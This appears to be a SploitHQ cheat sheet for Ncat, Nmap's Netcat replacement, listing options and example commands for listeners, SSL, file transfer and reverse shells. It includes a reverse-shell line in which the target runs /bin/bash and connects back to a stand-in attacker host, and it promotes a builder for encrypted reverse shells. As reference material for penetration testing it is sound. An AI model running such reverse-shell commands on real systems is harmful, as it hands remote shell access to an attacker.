# Ncat – Feature-Rich Netcat Replacement from Nmap

**Ncat** is a powerful networking utility bundled with the Nmap suite. It's designed as a modern replacement for the traditional Netcat (`nc`), with support for SSL, connection brokering, input/output redirection, and more. It’s useful for debugging, file transfers, port scanning, reverse shells, and encrypted communication.

🔗 [Explore Ncat Usage on SploitHQ](https://sploithq.com/ncat)

---

## 🔍 What Can Ncat Do?

- Open TCP/UDP connections from the command line
- Listen on ports for incoming connections
- Act as a chat server, proxy, or reverse shell listener
- Transfer files over sockets
- Support **SSL encryption** and **proxy chains**
- Useful in red teaming, network troubleshooting, and service emulation

---

## ⚙️ Basic Syntax

```bash
ncat [options] [host] [port]
```

---

## 🧰 Common Options

| Option             | Description                                       |
|--------------------|---------------------------------------------------|
| `-l`               | Listen for incoming connections                   |
| `-k`               | Keep listening after client disconnects           |
| `--ssl`            | Use SSL/TLS encryption                            |
| `-e <cmd>`         | Execute command after connection (reverse shell) |
| `--exec <cmd>`     | Safer alternative to `-e`, with controlled input  |
| `--proxy <host:port>` | Use a proxy to reach destination              |
| `--sh-exec <cmd>`  | Execute via shell instead of binary exec          |
| `--send-only`      | Only send data, don’t read                        |
| `--recv-only`      | Only receive data                                 |
| `--keep-open`      | Keep connection open for multiple clients         |

---

## 🧪 Examples

### Simple client connection
```bash
ncat example.com 80
```

### Listen for connections on port 4444
```bash
ncat -lvp 4444
```

### Encrypted listener (SSL)
```bash
ncat --ssl -l 443
```

### Reverse shell (attacker listens)
```bash
ncat -lvnp 4444
```

### Reverse shell (target connects back)
```bash
ncat attacker-ip 4444 -e /bin/bash
```

### File transfer (server side)
```bash
ncat -l 1234 < file.txt
```

### File transfer (client side)
```bash
ncat server-ip 1234 > received.txt
```

---

## ⚠️ Notes

- `-e` may be disabled on some systems or require elevated privileges.
- Ncat is safer and more versatile than traditional Netcat.
- Ncat supports **IPv6**, **UDP**, and **SSL out-of-the-box**.
- Be cautious with listener shells — they expose your system to risk.

---

## 🌐 SploitHQ Shell Tools & Connectivity

👉 [Use the Ncat Command Builder on SploitHQ](https://sploithq.com/ncat)

- Build reverse shells with encryption
- Set up listening servers or chat clients
- Copy payloads for testing scenarios

---

## 🔗 Useful Links

- [Ncat Reference Guide (Nmap)](https://nmap.org/ncat/)
- [Ncat Man Page](https://man7.org/linux/man-pages/man1/ncat.1.html)
- [SploitHQ Ncat Page](https://sploithq.com/ncat)

---

## 📄 License

Ncat is distributed with the Nmap suite under a permissive license.  
This content is maintained by [SploitHQ](https://sploithq.com) and intended for legal testing and research purposes only.
